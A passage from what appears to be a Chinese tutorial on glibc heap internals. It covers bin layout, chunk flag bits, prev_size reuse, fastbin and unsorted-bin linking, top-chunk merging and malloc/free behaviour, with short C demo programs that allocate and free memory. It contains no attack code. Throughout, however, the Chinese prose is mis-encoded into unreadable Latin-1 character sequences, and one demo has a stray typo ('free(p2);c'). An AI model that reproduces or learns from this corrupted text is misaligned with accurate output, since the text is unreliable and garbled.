¹æ®ä¸€å®šçš„èŒƒå›´å­˜å‚¨åœ¨ä¸€ä¸ªlarbiné“¾è¡¨ä¸­ large chunkå¯ä»¥æ·»åŠ ã€åˆ é™¤åœ¨large binçš„ä»»ä½•ä¸€ä¸ªä½ç½® åœ¨è¿™63ä¸ªlargebinsä¸­ï¼šç¬¬ä¸€ç»„çš„32ä¸ªlargebiné“¾ä¾æ¬¡ä»¥64å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼Œå³ç¬¬ä¸€ä¸ªlargebiné“¾ä¸­chunksizeä¸º1024-1087å­—èŠ‚ï¼Œç¬¬äºŒä¸ªlarge binä¸­chunk sizeä¸º1088~1151å­—èŠ‚ã€‚ç¬¬äºŒç»„çš„16ä¸ªlargebiné“¾ä¾æ¬¡ä»¥512å­—èŠ‚æ­¥é•¿ä¸ºé—´éš”ï¼›ç¬¬ä¸‰ç»„çš„8ä¸ªlargebiné“¾ä»¥æ­¥é•¿4096ä¸ºé—´éš”ï¼›ç¬¬å››ç»„çš„4ä¸ªlargebiné“¾ä»¥32768å­—èŠ‚ä¸ºé—´éš”ï¼›ç¬¬äº”ç»„çš„2ä¸ªlargebiné“¾ä»¥262144å­—èŠ‚ä¸ºé—´éš”ï¼›æœ€åä¸€ç»„**çš„largebiné“¾ä¸­çš„chunkå¤§å°æ— é™åˆ¶ 0x06 å †çš„è°ƒç”¨æµç¨‹ å½“åº”ç”¨ç¨‹åºâ€œç¬¬ä¸€æ¬¡â€ä½¿ç”¨mallocå‡½æ•°ç”³è¯·åŠ¨æ€å†…å­˜æ—¶ï¼Œglibcåº“ä¼šå‘å†…æ ¸ç”³è¯·ä¸€å—éå¸¸å¤§çš„åŠ¨æ€å†…å­˜ï¼Œè¿™å—åŠ¨æ€å†…å­˜ä¼šæ¯”mallocç”³è¯·çš„å¤§å°å¤§å¾ˆå¤š glibcç”³è¯·åˆ°è¿™å—å¤§çš„å†…å­˜ä¹‹åï¼Œæ ¹æ®mallocéœ€è¦çš„å¤§å°ï¼Œç„¶ååˆ‡å‰²ç›¸åº”çš„å¤§å°ç»™åº”ç”¨ç¨‹åºmallocå‡½æ•°ä½¿ç”¨ å½“åº”ç”¨å±‚freeä¹‹åï¼Œä¼šå°†åˆšæ‰ä½¿ç”¨åˆ°çš„åŠ¨æ€å†…å­˜è¿”å›ç»™glibcï¼Œä½†æ˜¯è¿”å›çš„å†…å­˜ä¸æ˜¯è¿”å›ç»™top chunkï¼Œè€Œæ˜¯ç”±binsé“¾ç®¡ç† å½“ç¨‹åºå†æ¬¡mallocæ—¶ï¼Œä¼šä»åˆšæ‰ç”³è¯·çš„å¾ˆå¤§çš„åŠ¨æ€å†…å­˜å»å–ï¼Œä¸ä¼šå†å»å‘å†…æ ¸ç”³è¯·å†…å­˜ åªæœ‰å½“ç¬¬ä¸€æ¬¡ç”³è¯·çš„åŠ¨æ€å†…å­˜ä½¿ç”¨å®Œæ—¶ï¼Œglibcæ‰ä¼šå†æ¬¡é€šè¿‡brk/mmapç³»ç»Ÿè°ƒç”¨å‘å†…æ ¸å»è¦å†…å­˜ 0x07 chunkçš„æ ‡å¿—ä½1.ç®€ä»‹ NON_MAIN_ARENAï¼šè®°å½•å½“å‰ chunk æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹ IS_MAPPEDï¼šè®°å½•å½“å‰chunkæ˜¯å¦æ˜¯ç”±mmapåˆ†é…çš„ PREV_INUSEï¼šå¦‚æœå‰é¢ä¸€ä¸ªchunkå¤„äºåˆ†é…çŠ¶æ€ï¼Œé‚£ä¹ˆæ­¤ä½ä¸º1ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ size å­—æ®µçš„ P ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ã€‚å½“ä¸€ä¸ªchunk çš„size çš„Pä½ä¸º0æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ prev_size å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª chunk çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—²chunkä¹‹é—´çš„åˆå¹¶ 2.å®ç° åœ¨64ä½ç³»ç»Ÿä¸­ä¸º16å­—èŠ‚å¯¹é½ï¼Œåœ¨32ä½çš„ç³»ç»Ÿä¸­ä¸º8å­—èŠ‚å¯¹é½ã€‚å› æ­¤åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œstruct malloc_chunkç»“æ„ä½“çš„å¤§å°çš„æœ€å4ä¸ªä½æ•°æ˜¯æ²¡æœ‰è¢«ä½¿ç”¨çš„ï¼Œ32ä½ç³»ç»Ÿä¸­ï¼Œæœ€å3ä¸ªä½æ•°æ˜¯æ²¡æœ‰è¢«ä½¿ç”¨çš„ã€‚ æ‰€ä»¥ï¼Œglibcç”¨struct malloc_chunkç»“æ„ä½“çš„fdæˆå‘˜çš„æœ€å3ä¸ªæ¯”ç‰¹ä½æ¥è¡¨ç¤ºå½“å‰chunkå¤„äºä»€ä¹ˆçŠ¶æ€ã€‚åªéœ€è¦å°†fdæˆå‘˜ç›¸åº”çš„æ¯”ç‰¹ä½ç½®ä¸º1ï¼Œå°±å¯ä»¥ä»£è¡¨å½“å‰chunkå¤„äºä»€ä¹ˆçŠ¶æ€ 3.PREV_INUSEä½å¯¼è‡´çš„chunkåˆå¹¶12345678910111213#define prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE) static void_int_free (mstate av, mchunkptr p, int have_lock)&#123; /* consolidate backward */ if (!prev_inuse(p)) &#123; prevsize = prev_size (p); //1 size += prevsize; //2 p = chunk_at_offset(p, -((long) prevsize)); //3 unlink(av, p, bck, fwd); //4 &#125;&#125; é¦–å…ˆä½¿ç”¨prev_inuseå®å®šä¹‰åˆ¤æ–­pçš„PREV_INUSEä½æ˜¯å¦ä¸º0 å¦‚æœPREV_INUSEä½ä¸º0ï¼Œé‚£ä¹ˆprev_inuseå®è¿”å›0ï¼Œifæ¡ä»¶ä¸º1ï¼Œè¿›å…¥ifè¯­å¥ä½“ä¸­ 1.é€šè¿‡recv_sizeå‡½æ•°å¾—åˆ°å‰é¢è¦åˆå¹¶çš„chunkçš„å¤§å° 2.å°†è‡ªå·±çš„å¤§å°ä¸å‰é¢çš„presizeç›¸åŠ å¾—åˆ°åˆå¹¶åçš„chunkçš„å¤§å° 3.å°†pçš„æŒ‡é’ˆå‘å‰ç§»åŠ¨ï¼Œç§»åŠ¨åˆ°å‰é¢é‚£ä¸ªchunkçš„å¼€å¤´å¤„ 4.unlinkæ˜¯å°†ä¸¤ä¸ªè¦åˆå¹¶çš„chunkå„è‡ªä»åŸæ¥çš„biné“¾ä¸Šé¢æ–­ä¸‹æ¥ï¼Œç„¶åè¿›è¡Œåˆå¹¶ 4.fast chunkçš„PREV_INUSE â‘ æ— è®ºfastchunkå‰é¢çš„chunkæ˜¯å¦å¤„äºåˆ†é…çŠ¶æ€ï¼ŒPREV_INUSEå§‹ç»ˆä¸º1ã€‚å› ä¸ºç³»ç»Ÿä¸å¸Œæœ›fastchunkä¸å‰é¢çš„chunkä¹‹é—´è¿›è¡Œåˆå¹¶ â‘¡ä¸è®ºå½“å‰çš„fastchunkæ˜¯å¦å¤„äºåˆ†é…çŠ¶æ€ï¼Œè¯¥chunkåé¢çš„chunkçš„PREV_INUSEä½ä¸€å®šä¸º1ï¼Œä¹Ÿæ˜¯ä¸ºäº†é˜²æ­¢åé¢çš„chunkä¸fastchunkåˆå¹¶ 5.æ¼”ç¤º12345678910111213141516#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x70; void *p1=malloc(size); void *p2=malloc(size); void *p3=malloc(size); //ä¸ºäº†è¾¾åˆ°æ¼”ç¤ºæ•ˆæœï¼Œé˜²æ­¢åˆå¹¶åçš„chunkä¸top chunkåˆå¹¶ sleep(0); //åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„ free(p1); free(p2); return 0;&#125; å¯ä»¥çœ‹åˆ°æ­£å¥½åˆ†é…äº†3å— çœ‹ä¸€ä¸‹å†…å­˜åœ°å€ å½“æˆ‘ä»¬é‡Šæ”¾ä¸€ä¸ªä¹‹å è¿™é‡Œç‰ˆæœ¬è¾ƒé«˜ æ·¦ æˆ‘å…ˆå»æ‰¾ä¸ªè™šæ‹Ÿæœº å¯ä»¥çœ‹åˆ°æ˜¯åŠ åˆ°tcacheä¸­ å¼„äº†ä¸€æ™šä¸Š æˆ‘åˆå›æ¥äº† é‡Šæ”¾ç¬¬ä¸€ä¸ª é‡Šæ”¾ä¸¤ä¸ª 0x08 chunkçš„mchunk_prev_sizeæˆå‘˜çš„ç©ºé—´å¤ç”¨1.ä»‹ç» â‘ å¦‚æœæœ¬chunkå‰é¢ä¸€ä¸ªchunkå¤„äºç©ºé—²çŠ¶æ€ï¼Œé‚£ä¹ˆmchunk_prev_sizeæˆå‘˜æ‰æœ‰ç”¨ï¼Œæ­¤æ—¶ç”¨æ¥è®°å½•å‰ä¸€ä¸ªchunkçš„å¤§å° â‘¡å¦‚æœæœ¬chunkå‰é¢ä¸€ä¸ªchunkå¤„äºä½¿ç”¨çŠ¶æ€ï¼Œé‚£ä¹ˆmchunk_prev_sizeæˆå‘˜å¯¹äºæœ¬chunkæ¥è¯´æ˜¯ä¸ä½¿ç”¨çš„ 2.å®ç° å½“å‰ä¸€ä¸ªchunkç”³è¯·çš„æ•°æ®ç©ºé—´ç”³è¯·çš„å¤§å°å¯¹16å–ä½™åï¼Œå¦‚æœå¤šå‡ºæ¥çš„å¤§å°å°äºç­‰äº8å­—èŠ‚ï¼Œé‚£ä¹ˆè¿™ä¸ªå¤šå‡ºæ¥çš„å¤§å°å°±æ”¾å…¥ä¸‹ä¸€ä¸ªchunkçš„mchunk_prev_sizeä¸­å­˜å‚¨ å¦åˆ™ï¼Œå¦‚æœå¤šå‡ºæ¥çš„å¤§å°å¤§äº8å­—èŠ‚ï¼Œé‚£ä¹ˆå‰ä¸€ä¸ªchunkå°±ä¸ä½¿ç”¨ä¸‹ä¸€ä¸ªchunkçš„mchunk_prev_sizeæˆå‘˜ 3.æ¼”ç¤º123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x108; void *p1=malloc(size); sleep(0); //åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„ free(p1); return 0;&#125; 0x108æ¨¡0x10ä¹‹åè¿˜æœ‰8 è¯´æ˜æ˜¯å ç”¨äº†ä¸‹ä¸€ä¸ªchunkçš„pre_size 64ä½16å­—èŠ‚å¯¹é½ 0x100(åˆ†é…)+0x10(å¤´)+0x1(P) 123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x109; void *p1=malloc(size); sleep(0); //åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„ free(p1); return 0;&#125; 0x109æ¨¡0x10ä¸º9 æ‰€ä»¥pre_sizeä¸å¤Ÿç”¨ éœ€è¦å¤šç”³è¯·1ä¸ªå•å…ƒ chunkè¢«éšå¼å¯¹é½ä½0x110 64ä½16å­—èŠ‚å¯¹é½ 0x110+0x10+0x1 0x09 chunkçš„å¤§å°å…¶å®ä¸Šä¸€èŠ‚æˆ‘ä»¬å°±æ¼”ç¤ºäº† ä½†è¿™ä¸€èŠ‚è¿˜æ˜¯é‡ç‚¹è®²ä¸€ä¸‹ 1.chunkçš„å®é™…å¤§å° å½“ç”¨æˆ·é€šè¿‡mallocå‡½æ•°ç”³è¯·å †å†…å­˜æ—¶ï¼Œå¯ä»¥ä½¿ç”¨çš„å†…å­˜çš„èµ·å§‹åœ°å€æ˜¯ä»fdæˆå‘˜å¼€å§‹çš„ï¼Œæ‰€ä»¥ç”¨æˆ·æ— æ³•è®¿é—®ç»“æ„ä½“çš„å‰ä¸¤ä¸ªæˆå‘˜ å½“ç”¨æˆ·ç”³è¯·sizeå¤§å°çš„å †å—æ—¶ï¼Œåœ¨glibcä¸­æœ¬è´¨ä¸Šæ˜¯ç”³è¯·äº†size+16å¤§å°ï¼ˆ64ä½ç³»ç»Ÿä¸­ï¼‰çš„å†…å­˜ï¼Œå› ä¸ºè¦åŠ ä¸Šå‰ä¸¤ä¸ªæˆå‘˜ ä¾‹å¦‚ï¼šmalloc(0x10);ç”³è¯·äº†0x10å¤§å°çš„å †å†…å­˜ï¼Œæœ¬è´¨ä¸Šåœ¨glibcä¸­ç”³è¯·äº†0x10+0x10=0x20å¤§å°çš„ç©ºé—´ chunkçš„å®é™…å¤§å°=mallocçš„å¤§å°+chunkçš„å‰ä¸¤ä¸ªæˆå‘˜+mchunk_prev_sizeæˆå‘˜çš„åˆå¹¶æ“ä½œ+chunkå¯¹é½è§„åˆ™ è¿™ä¸ªä¸Šé¢æ¼”ç¤ºè¿‡äº† å°±ä¸æ¼”ç¤ºäº† 2.chunkçš„æœ€ä½å¤§å° mallocçš„å †å—å¤§å°åœ¨glibcä¸­ä¼šåŠ ä¸Šå‰ä¸¤ä¸ªæˆå‘˜çš„å¤§å°ï¼ˆ0x10å¤§å°ï¼‰ï¼Œæ‰€ä»¥å½“ä½ åˆ†é…ä¸€ä¸ªå †å†…å­˜æ—¶ï¼Œå †å†…å­˜çš„æœ€å°å¤§å°ä¸€å®šä¸º0x20ï¼ˆ0x10+0x10ï¼‰ã€‚ï¼ˆå³ä½¿mallocæ²¡æœ‰æŒ‡å®šå¤§å°ï¼Œä¹Ÿè¦åˆ†é…fdå’Œbkæˆå‘˜ï¼Œæ‰€ä»¥åŠ èµ·æ¥å°±æ˜¯malloc_chunkç»“æ„ä½“çš„å‰4ä¸ªæˆå‘˜çš„å¤§å°æ€»å’Œï¼‰ chunkçš„æœ€ä½å¤§å°ä¸€å®šä¸º0x20å¤§å° 123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; //int size=0x109; void *p1=malloc(0); sleep(0); //åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ç”¨å¤„ free(p1); return 0;&#125; 0x10 binsçš„å•å‘é“¾è¡¨ã€åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„1.fastbinsçš„å•å‘é“¾è¡¨å­˜å‚¨ç»“æ„ fastbinsæ˜¯å•å‘é“¾è¡¨å­˜å‚¨ï¼Œfastbinsä¸­çš„çš„chunkæ˜¯ä¸ä¼šåˆå¹¶çš„ï¼ˆglibcè§„å®šè¿™äº›chunkçš„PREV_INUSEä½æ°¸è¿œä¸º1ï¼‰ å­˜å‚¨ç»“æ„ï¼š fastbinsçš„å­˜å‚¨é‡‡ç”¨åè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„åŸåˆ™ï¼šåfreeçš„chunkä¼šè¢«æ·»åŠ åˆ°å…ˆfreeçš„chunkçš„åé¢ï¼›åŒç†ï¼Œé€šè¿‡mallocå–å‡ºchunkæ—¶æ˜¯å…ˆå»å–æœ€æ–°æ”¾è¿›å»çš„ å› ä¸ºæ˜¯å•é“¾è¡¨ï¼Œfastbinsä¸­çš„æ‰€æœ‰chunkçš„bkæ˜¯æ²¡æœ‰ç”¨åˆ°çš„ å¹¶ä¸”fastbinsæ¯”è¾ƒç‰¹æ®Šï¼Œä¸€ä¸ªfastbiné“¾ç¬¬ä¸€ä¸ªchunkæŒ‡å‘äºä¸€ä¸ªç‰¹æ®Šçš„â€œ0â€ï¼Œç„¶ååé¢æ¥çš„æ˜¯åfreeçš„chunkâ€¦â€¦ä»¥æ­¤ç±»æ¨ï¼Œæœ€åä¸€ä¸ªchunkå†ç”±arenaçš„malloc_stateçš„fastbinsYæ•°ç»„æ‰€ç®¡ç† æ¼”ç¤º 123456789101112131415161718#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x10; int size2=0x20; int *p1=malloc(size); int *p2=malloc(size); int *p3=malloc(size2); sleep(0); //åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ²¡æœ‰å…¶ä»–ä½œç”¨ free(p1); free(p2); free(p3); return 0;&#125; æ‰“åˆ°æ–­ç‚¹å¤„ heapçš„ä¿¡æ¯ é‡Šæ”¾p1 p2 å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªè¢«é‡Šæ”¾chunkçš„fdæŒ‡é’ˆæŒ‡å‘0 è€Œç¬¬äºŒä¸ªè¢«é‡Šæ”¾chunkçš„fdæŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ª çœ‹ä¸€ä¸‹main_arena å¯ä»¥çœ‹åˆ°æ˜¯æŒ‡å‘æœ€åä¸€ä¸ªchunk ä¹Ÿå°±éªŒè¯äº†ä¸Šé¢çš„ç»“è®º æ¥ä¸‹æ¥æˆ‘ä»¬é‡Šæ”¾ç¬¬ä¸‰ä¸ª ç”±äºä¸å‰ä¸¤ä¸ªå¤§å°ä¸åŒæ‰€ä»¥æˆ‘ä»¬ä¼šæ–°å¼€ä¸€ä¸ªé“¾è¡¨ è¯´æ˜main_arenaçš„åœ°å€ä¹Ÿä¸ä¸€æ · æ­¤æ¬¡æ¼”ç¤ºä¹Ÿå°±å®Œæˆäº† 32ä½å¯è‡ªè¡Œæ¼”ç¤º 2.unsortedbinçš„åŒå‘é“¾è¡¨å­˜å‚¨ç»“æ„ freeçš„chunkå¤§å°å¦‚æœå¤§äº0x80ä¼šæ”¾åˆ°unsortedbinä¸Š unsortedbinå­˜å‚¨è¿™äº›chunkæ˜¯ä½¿ç”¨åŒå‘å¾ªç¯é“¾è¡¨è¿›è¡Œå­˜å‚¨çš„ï¼ˆsmallbinsã€largebinsä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæ­¤å¤„åªä»‹ç»unsortedbinï¼‰ å­˜å‚¨ç»“æ„ï¼š å­˜å‚¨å¾ªç¯å…ˆå…¥å…ˆå‡ºï¼ˆFIFOï¼‰åŸåˆ™ï¼šä¸Šé¢çš„æ˜¯å…ˆfreeæ‰çš„chunkï¼Œä¸‹é¢æ˜¯åfreeæ‰çš„chunkï¼›åŒç†ï¼Œé€šè¿‡mallocå–å‡ºchunkæ—¶æ˜¯å…ˆå–ä¸Šé¢çš„ï¼Œå†å–ä¸‹é¢çš„ ä¸€ä¸ªbinsä¸­åªæœ‰ä¸€ä¸ªfreechunkæ—¶ï¼šå°±æ˜¯ä¸‹é¢è¿™ç§è¡¨ç¤ºå½¢å¼ã€‚å¯ä»¥çœ‹åˆ°freechunkçš„fdå’Œbkéƒ½æŒ‡å‘äºbinsçš„fdï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨gdbè°ƒè¯•æ—¶å¯ä»¥ç”¨å‘½ä»¤çœ‹åˆ°ï¼Œå½“biné“¾ä¸­åªæœ‰ä¸€ä¸ªfreechunkæ—¶ï¼Œå…¶fdå’Œbkéƒ½æ˜¯ç›¸åŒçš„ï¼Œéƒ½æŒ‡å‘äºbinsçš„fd ä¸€ä¸ªbinsä¸­æœ‰å¤šä¸ªfreechunkæ—¶ï¼šä¸Šé¢ä½¿æˆ‘ä»¬çš„struct malloc_stateç»“æ„ä½“ï¼Œç»“æ„ä½“ä¸­çš„binsæ•°ç»„å­˜å‚¨çš„å°±æ˜¯è¿™äº›biné“¾ï¼Œä¸‹é¢å°±æ˜¯binsæ•°ç»„ä¸­å­˜å‚¨unsortedbinçš„ä½ç½®ï¼Œè¿™ä¸ªæ•°ç»„å…ƒç´ å­˜å‚¨çš„å…¶å®å°±æ˜¯ä¸€ä¸ªfdå’Œä¸€ä¸ªbkæŒ‡é’ˆã€‚ä¸‹é¢ç¬¬ä¸€ä¸ªå°±æ˜¯ç¬¬ä¸€ä¸ªfreeæ‰çš„chunkï¼Œå†ä¸‹é¢ä¸€ä¸ªå°±æ˜¯ç¬¬äºŒä¸ªfreeæ‰çš„chunkâ€¦â€¦ä»¥æ­¤ç±»æ¨ æ¼”ç¤º 1234567891011121314151617#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x100; int *p1=malloc(size); int *temp=malloc(size); //é˜²æ­¢p1ä¸p2åˆå¹¶ int *p2=malloc(size); int *p3=malloc(size); //é˜²æ­¢p2è¢«top chunkåˆå¹¶ sleep(0); free(p1); free(p2); return 0;&#125; æ‰“æ–­ç‚¹ é‡Šæ”¾p1 ä»ä¸Šé¢æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°ä¸‹ä¸€ä¸ªchunkçš„æ ‡å¿—pä½ä¸º0äº† çœ‹ä¸‹main_arena é‡Šæ”¾p2 å¯ä»¥çœ‹åˆ°main_arenaæ˜¯å˜äº†çš„ binså¤´ä¸­fd-&gt;p2 bk-&gt;p1 æ¼”ç¤ºå®Œæˆ 0x11 top chunkçš„å‘å‰åˆå¹¶1.top chunkæ¦‚å¿µ å½“æˆ‘ä»¬åˆ†é…ä¸€å—å †å†…å­˜æ—¶ï¼Œtop chunkæ˜¯å‡ºäºåœ°å€çš„æœ€é«˜å¤„çš„ï¼Œå…¶å‰é¢å°±æ˜¯æˆ‘ä»¬æ‰€ç”³è¯·çš„chunk 2.top chunkçš„åˆå¹¶æ“ä½œ å¦‚æœtop chunkå‰é¢çš„chunkä¸æ˜¯fast chunkå¹¶ä¸”å¤„äºç©ºé—²ï¼Œé‚£ä¹ˆtop chunkå°±ä¼šåˆå¹¶è¿™ä¸ªchunk å¦‚æœtop chunkå‰é¢çš„chunkæ˜¯fast chunkï¼Œä¸è®ºæ˜¯å¦ç©ºé—²ï¼Œtop chunkéƒ½ä¸ä¼šåˆå¹¶è¿™ä¸ªchunk 3.æ¼”ç¤º12345678910111213#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x20; void *p1=malloc(size); void *p2=malloc(size); sleep(0); //åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨ free(p2); return 0;&#125; æ–­ç‚¹ å †ä¿¡æ¯ é‡Šæ”¾p2 å¯ä»¥çœ‹åˆ°p2æ˜¯fastbins æœªè¢«åˆå¹¶ 12345678910111213#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x20; void *p1=malloc(size); void *p2=malloc(0x100); sleep(0); //åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨ free(p2); return 0;&#125; æ–­ç‚¹ é‡Šæ”¾p2 å¯ä»¥çœ‹åˆ°p2è¢«åˆå¹¶äº† 4.å¦‚ä½•é˜²æ­¢top chunkçš„åˆå¹¶ åªéœ€è¦åœ¨freeæ‰çš„chunkåé¢ç»§ç»­ç”³è¯·ä¸€ä¸ªchunkï¼Œè¿™æ ·top chunkå°±ä¸ä¼šåˆå¹¶ä¹‹å‰çš„chunk 0x12 chunkçš„mallocã€free1.mallocçš„æœºåˆ¶ å¦‚æœç¨‹åºæ˜¯ç¬¬ä¸€æ¬¡mallocï¼šä¼šåˆ›å»ºä¸€ä¸ªå¾ˆå¤§çš„â€œtop chunkâ€ å¦‚æœç¨‹åºæ˜¯ç¬¬äºŒæ¬¡åŠä¹‹åmallocï¼šä¼šå»å…ˆå‘binsé“¾è¡¨å¯»æ‰¾ç©ºé—´ï¼Œå¦‚æœæ²¡æœ‰å†å»å‘â€œtop chunkâ€è¦ç©ºé—´ï¼›å¦‚æœâ€œtop chunkâ€ä½¿ç”¨å®Œäº†å†é€šè¿‡glibcé‡æ–°ç”³è¯·ä¸€å—æ–°çš„â€œtop chunkâ€ 2.æ¼”ç¤ºä¸Šé¢æˆ‘ä»¬å·²ç»æ¼”ç¤ºè¿‡å¾ˆå¤šå›äº† ç¬¬ä¸€æ¬¡å°±ä¸æ¼”ç¤ºäº† è¿™é‡Œä¸»è¦æ¥çœ‹ä¸€ä¸‹ç¬¬äºŒæ¬¡çš„malloc è¿™é‡Œæ˜¯æ‹¿fastbinçš„ä¾‹å­ æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆfastbinï¼‰123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x20; void *p1=malloc(size); sleep(0); //åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨ free(p1); void *p2=malloc(0x20); return 0;&#125; ç›´æ¥çœ‹freeæ‰p1ä¹‹åå¯ä»¥çœ‹åˆ°æ˜¯è¿›å…¥fastbinäº† æˆ‘ä»¬åœ¨æ¥ç”³è¯·p2 å¯ä»¥çœ‹è§æ˜¯ç›´æ¥è¦†ç›–äº†p1 åˆ‡å‰²ä¸€å—chunkï¼ˆfastbinï¼‰1234567891011121314#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x20; void *p1=malloc(size); sleep(0); //åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ï¼Œæ— å…¶ä»–ä½œç”¨ free(p1); void *p2=malloc(0x10); return 0;&#125; æˆ‘ä»¬ç›´æ¥çœ‹p2åˆ†é…ä¹‹åæŠŠ è¿™é‡Œå¯ä»¥çœ‹å‡ºå®ƒå¹¶æœªç”¨fastbinçš„chunk è€Œæ˜¯ä»top chunkåˆ‡å‰²äº†ä¸€éƒ¨åˆ† æ°å¥½åˆ†å‰²ä¸€æ•´å—çš„free chunkï¼ˆunsorted binï¼‰12345678910111213141516#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x200; void *p=malloc(size); void *p2=malloc(size); //ä¸ºäº†è¾¾åˆ°æ¼”ç¤ºæ•ˆæœï¼Œé˜²æ­¢pè¢«top chunkåˆå¹¶ sleep(0); //åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ free(p); void *p3=malloc(size); free(p3); return 0;&#125; çœ‹ä¸€ä¸‹chunkçš„ä¿¡æ¯ free p1ï¼Œå°†p1æ”¾å…¥äº†unsorted binä¸­ åˆ†é…p3 å¯ä»¥çœ‹åˆ°æ˜¯ç›´æ¥è¦†ç›–p1çš„åœ°æ–¹ åˆ‡å‰²ä¸€å—chunkï¼ˆunsorted binï¼‰123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; void *p=malloc(0x100); void *temp=malloc(0x100); //ä¸ºäº†é˜²æ­¢pè¢«topchunkåˆå¹¶ sleep(0); //åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ free(p); void *p2=malloc(0x30); free(p2); return 0;&#125; è¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹p2åˆ†é…ä¹‹å è¿™é‡Œä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ä¸ªæƒ…å†µå‘¢ï¼Ÿ å…¶å®å®ƒæ˜¯åœ¨unsorted binä¸­åˆ‡å‰²äº†ä¸€å—ç¬¦åˆè‡ªå·±å¤§å°çš„chunk æ‹¿å‡ºæ¥åˆ†é… åˆ†å‰²ä¸€å—è¾ƒå¤§çš„free chunkï¼ˆunsorted binï¼‰ 123456789101112131415#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; void *p=malloc(0x100); void *temp=malloc(0x100); //ä¸ºäº†é˜²æ­¢pè¢«topchunkåˆå¹¶ sleep(0); //åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ free(p); void *p2=malloc(0x300); free(p2);c return 0;&#125; æ ¹æ®ä¸Šé¢çš„ç†è®ºè¿™å›å°±åº”è¯¥å»top chunkä¸­åˆ‡å‰²äº† äº‹å®ä¹Ÿç¡®å®å¦‚æ­¤ ç»è¿‡ä»¥ä¸Šæ¼”ç¤ºæˆ‘ä»¬ä¸éš¾å¾—å‡ºä¸€ä¸‹ç»“è®º åªè¦åˆ‡å‰²å¤§å°æ­£å¥½ å®ƒå°±ä¼šä»å·²freeçš„chunkä¸­å¯»æ‰¾ å…³äºfastbin å’Œ unsorted binä¸­free chunkåˆ†é…æ˜¯ä¸ä¸€æ ·çš„ å¦‚æœè¾ƒå¤§ ä¼šä»top chunkä¸­å¯»æ‰¾ 3.freeçš„æœºåˆ¶ â‘ å¦‚æœfreeçš„chunkçš„å¤§å°åœ¨0x20~0x80ä¹‹é—´ï¼ˆfastbinçš„èŒƒå›´ï¼‰ï¼Œé‚£ä¹ˆè¯¥chunkç›´æ¥æ”¾åˆ°fast binä¸Š â‘¡å¦‚æœfreeçš„chunkçš„å¤§å°å¤§äº0x80ï¼ˆå¤§äºfast binçš„èŒƒå›´ï¼‰ï¼Œæ­¤æ—¶ä¸ä¼šç›´æ¥æ”¾åˆ°small binæˆ–è€…large binä¸Šé¢ã€‚è€Œæ˜¯æ”¾åˆ°unsorted binä¸Šé¢ 0x13 malloc_consolidateè¿™ä¸ªä¸»è¦æ˜¯è§£å†³unsorted binä¸­çš„ç¢ç‰‡åŒ–ï¼Œæ•´åˆæˆæ–°çš„binï¼Œä¹Ÿå°±æ˜¯æ”¾å…¥small binæˆ–large binä¸­ 1.consolidateçš„å®šä¹‰ 